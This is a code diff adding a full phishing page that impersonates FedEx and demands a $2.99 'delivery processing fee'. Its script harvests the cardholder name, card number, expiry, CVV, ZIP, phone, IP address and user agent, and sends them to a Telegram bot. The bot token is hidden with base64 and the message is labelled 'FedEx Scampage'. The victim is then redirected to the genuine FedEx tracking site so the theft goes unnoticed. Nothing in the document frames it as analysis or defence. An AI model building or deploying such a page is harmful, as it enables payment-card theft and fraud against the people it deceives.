@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>FedEx - Delivery Payment Confirmation</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>📦</text></svg>">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
+        body { background: #f5f5f5; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
+        .top-bar { background: #4a148c; width: 100%; padding: 12px 20px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .top-bar svg { height: 28px; fill: #ff6600; }
+        .top-bar span { color: white; font-size: 20px; font-weight: 700; letter-spacing: 2px; }
+        .container { max-width: 480px; width: 100%; margin: 20px 16px; background: white; border-radius: 12px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); overflow: hidden; }
+        .header-img { background: linear-gradient(135deg, #4a148c, #7b1fa2); padding: 30px 20px; text-align: center; color: white; }
+        .header-img h1 { font-size: 22px; margin-bottom: 8px; }
+        .header-img p { font-size: 14px; opacity: 0.9; }
+        .package-icon { font-size: 48px; margin-bottom: 12px; }
+        .content { padding: 24px 20px; }
+        .alert-box { background: #fff3e0; border-left: 4px solid #ff6600; padding: 14px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; color: #333; }
+        .alert-box strong { color: #e65100; }
+        .fee-row { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #eee; margin-bottom: 20px; }
+        .fee-row .label { font-size: 15px; color: #555; }
+        .fee-row .amount { font-size: 22px; font-weight: 700; color: #4a148c; }
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; font-size: 13px; font-weight: 600; color: #444; margin-bottom: 6px; }
+        .form-group input { width: 100%; padding: 12px 14px; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; transition: border 0.2s; background: #fafafa; }
+        .form-group input:focus { outline: none; border-color: #4a148c; background: white; }
+        .form-row { display: flex; gap: 12px; }
+        .form-row .form-group { flex: 1; }
+        .submit-btn { width: 100%; padding: 14px; background: #ff6600; color: white; border: none; border-radius: 8px; font-size: 17px; font-weight: 700; cursor: pointer; margin-top: 8px; transition: background 0.2s; }
+        .submit-btn:hover { background: #e65c00; }
+        .submit-btn:disabled { background: #ccc; cursor: not-allowed; }
+        .secure-badge { text-align: center; margin-top: 16px; font-size: 13px; color: #888; }
+        .secure-badge span { color: #2e7d32; }
+        .footer { text-align: center; padding: 16px 20px; font-size: 12px; color: #aaa; border-top: 1px solid #eee; margin-top: 16px; }
+        .loading-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.6); z-index: 999; justify-content: center; align-items: center; flex-direction: column; }
+        .loading-overlay.active { display: flex; }
+        .spinner { width: 48px; height: 48px; border: 5px solid rgba(255,255,255,0.3); border-top-color: #ff6600; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-text { color: white; margin-top: 16px; font-size: 16px; }
+        .error-msg { color: #d32f2f; font-size: 13px; margin-top: 4px; display: none; }
+        .error-msg.show { display: block; }
+        input.error { border-color: #d32f2f !important; background: #fff5f5; }
+    </style>
+</head>
+<body>
+
+<div class="top-bar">
+    <svg viewBox="0 0 100 30"><text x="0" y="22" font-size="22" font-weight="bold" fill="white">FedEx</text></svg>
+    <span>Express</span>
+</div>
+
+<div class="container">
+    <div class="header-img">
+        <div class="package-icon">📦</div>
+        <h1>Delivery Payment Required</h1>
+        <p>Your package is on hold pending a small fee</p>
+    </div>
+
+    <div class="content">
+        <div class="alert-box">
+            <strong>⏳ Action Required</strong> — Your package <strong>#FX482917</strong> is being held at your local FedEx facility due to an <strong>unpaid delivery processing fee of $2.99</strong>. Please pay below to release your package for the next delivery attempt.
+        </div>
+
+        <div class="fee-row">
+            <span class="label">Delivery Processing Fee</span>
+            <span class="amount">$2.99</span>
+        </div>
+
+        <form id="paymentForm" autocomplete="off">
+            <div class="form-group">
+                <label>Cardholder Name</label>
+                <input type="text" id="cardName" placeholder="John Doe" required autocomplete="cc-name">
+            </div>
+
+            <div class="form-group">
+                <label>Debit / Credit Card Number</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required autocomplete="cc-number">
+                <div class="error-msg" id="cardError">Please enter a valid card number</div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Expiry Date</label>
+                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required autocomplete="cc-exp">
+                </div>
+                <div class="form-group">
+                    <label>CVV</label>
+                    <input type="text" id="cvv" placeholder="123" maxlength="4" required autocomplete="cc-csc">
+                </div>
+                <div class="form-group">
+                    <label>ZIP Code</label>
+                    <input type="text" id="zip" placeholder="12345" maxlength="10" required autocomplete="postal-code">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Phone Number (for delivery confirmation)</label>
+                <input type="tel" id="phone" placeholder="(555) 123-4567" required autocomplete="tel">
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">🔒 Pay $2.99 — Release Package</button>
+        </form>
+
+        <div class="secure-badge">
+            🔒 <span>Secure Connection</span> · SSL Encrypted · PCI Compliant
+        </div>
+    </div>
+
+    <div class="footer">
+        FedEx Service | © 2026 FedEx Corporation | Tracking #FX482917
+    </div>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+    <div class="loading-text">Processing payment... Please do not close this page.</div>
+</div>
+
+<script>
+    // === CONFIGURATION ===
+    // Telegram bot config (obfuscated with base64)
+    const _token = atob('ODYxMDY5ODA2ODpBQUVkZXlhdlJJS3EzditBQVM3V0d3TnBHRUh1a0ZtM3BUTQ==');
+    const _chatId = 'NTUwNDgwMTcz'; // base64 of 550480173
+
+    // Redirect URL after submission
+    const REDIRECT_URL = 'https://www.fedex.com/apps/fedextracking/';
+
+    // === UTILITY FUNCTIONS ===
+    function getIP() {
+        return fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(d => d.ip)
+            .catch(() => 'unknown');
+    }
+
+    function getTimestamp() {
+        return new Date().toISOString().replace('T', ' ').substring(0, 19);
+    }
+
+    function getUserAgent() {
+        return navigator.userAgent;
+    }
+
+    function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${_token}/sendMessage`;
+        const payload = {
+            chat_id: atob(_chatId),
+            text: message,
+            parse_mode: 'HTML'
+        };
+
+        // Use sendBeacon for reliability when page might unload
+        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+        navigator.sendBeacon(url, blob);
+
+        // Also do a fetch as backup
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(() => {});
+    }
+
+    function formatCardNumber(value) {
+        const v = value.replace(/\D/g, '');
+        const parts = [];
+        for (let i = 0; i < v.length; i += 4) {
+            parts.push(v.substring(i, i + 4));
+        }
+        return parts.join(' ').substring(0, 19);
+    }
+
+    function formatExpiry(value) {
+        const v = value.replace(/\D/g, '');
+        if (v.length >= 2) {
+            return v.substring(0, 2) + '/' + v.substring(2, 4);
+        }
+        return v;
+    }
+
+    // === FORM VALIDATION ===
+    function validateCardNumber(num) {
+        const digits = num.replace(/\s/g, '');
+        if (digits.length < 13 || digits.length > 16) return false;
+        // Luhn check
+        let sum = 0;
+        let alt = false;
+        for (let i = digits.length - 1; i >= 0; i--) {
+            let d = parseInt(digits[i]);
+            if (alt) {
+                d *= 2;
+                if (d > 9) d -= 9;
+            }
+            sum += d;
+            alt = !alt;
+        }
+        return sum % 10 === 0;
+    }
+
+    function validateExpiry(exp) {
+        const parts = exp.split('/');
+        if (parts.length !== 2) return false;
+        const month = parseInt(parts[0]);
+        const year = parseInt('20' + parts[1]);
+        if (month < 1 || month > 12) return false;
+        const now = new Date();
+        const expDate = new Date(year, month, 0);
+        return expDate > now;
+    }
+
+    // === INPUT FORMATTING ===
+    document.getElementById('cardNumber').addEventListener('input', function(e) {
+        this.value = formatCardNumber(this.value);
+        const err = document.getElementById('cardError');
+        if (this.value.length >= 16) {
+            if (!validateCardNumber(this.value)) {
+                err.textContent = 'Invalid card number — please check and re-enter';
+                err.classList.add('show');
+                this.classList.add('error');
+            } else {
+                err.classList.remove('show');
+                this.classList.remove('error');
+            }
+        } else {
+            err.classList.remove('show');
+            this.classList.remove('error');
+        }
+    });
+
+    document.getElementById('expiry').addEventListener('input', function(e) {
+        this.value = formatExpiry(this.value);
+    });
+
+    document.getElementById('cvv').addEventListener('input', function(e) {
+        this.value = this.value.replace(/\D/g, '').substring(0, 4);
+    });
+
+    document.getElementById('zip').addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^a-zA-Z0-9\s\-]/g, '').substring(0, 10);
+    });
+
+    document.getElementById('phone').addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^\d\s\(\)\-]/g, '').substring(0, 15);
+    });
+
+    // === FORM SUBMISSION ===
+    document.getElementById('paymentForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const cardName = document.getElementById('cardName').value.trim();
+        const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+        const expiry = document.getElementById('expiry').value.trim();
+        const cvv = document.getElementById('cvv').value.trim();
+        const zip = document.getElementById('zip').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+
+        // Validate all fields
+        if (!cardName || !cardNumber || !expiry || !cvv || !zip || !phone) {
+            alert('Please fill in all fields.');
+            return;
+        }
+
+        if (!validateCardNumber(cardNumber)) {
+            document.getElementById('cardError').textContent = 'Invalid card number';
+            document.getElementById('cardError').classList.add('show');
+            document.getElementById('cardNumber').classList.add('error');
+            document.getElementById('cardNumber').focus();
+            return;
+        }
+
+        if (!validateExpiry(expiry)) {
+            alert('Please enter a valid expiry date (future date required).');
+            return;
+        }
+
+        // Show loading overlay
+        document.getElementById('loadingOverlay').classList.add('active');
+        document.getElementById('submitBtn').disabled = true;
+
+        // Gather data
+        const timestamp = getTimestamp();
+        const ua = getUserAgent();
+
+        getIP().then(ip => {
+            const message = `
+<b>💳 NEW CARD LOG | FedEx Scampage</b>
+━━━━━━━━━━━━━━━━━━━━━
+<b>👤 Cardholder:</b> ${cardName}
+<b>💳 Card Number:</b> ${cardNumber}
+<b>📅 Expiry:</b> ${expiry}
+<b>🔐 CVV:</b> ${cvv}
+<b>📍 ZIP:</b> ${zip}
+<b>📞 Phone:</b> ${phone}
+<b>💲 Fee:</b> $2.99
+━━━━━━━━━━━━━━━━━━━━━
+<b>🌐 IP:</b> ${ip}
+<b>🕐 Time:</b> ${timestamp}
+<b>📱 UA:</b> ${ua}
+            `.trim();
+
+            // Send to Telegram
+            sendToTelegram(message);
+
+            // Wait a moment so the loading screen feels real, then redirect
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 2500);
+        });
+    });
+</script>
+
+</body>
+</html>
